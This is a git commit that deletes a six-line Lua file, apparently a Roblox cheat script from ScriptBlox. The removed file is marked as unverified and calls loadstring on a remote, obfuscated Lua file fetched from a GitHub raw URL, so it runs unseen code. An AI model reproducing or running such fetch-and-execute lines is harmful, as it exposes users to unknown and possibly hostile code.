977e2fb13c5ede8b5f2e31bb81702e583cfb9f0d
r3dd <140461084+1uue@users.noreply.github.com>
2026-02-06 17:54:23 +0300

    Delete zzzzzzzzzz.lua

--- zzzzzzzzzz.lua
+++
@@ -1,6 +0,0 @@
---[[
-	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
-]]
-loadstring(game:HttpGet("https://raw.githubusercontent.com/55xx/reko/refs/heads/main/obf_3gcCi7Y0RFc72nFdqODVt1x1g88fCFaiGQqV5513C1mbE85knijpnaV5W9968wjW.lua", true))()
-
---Para Usar Vai Em BoxGuis E BoxHaven
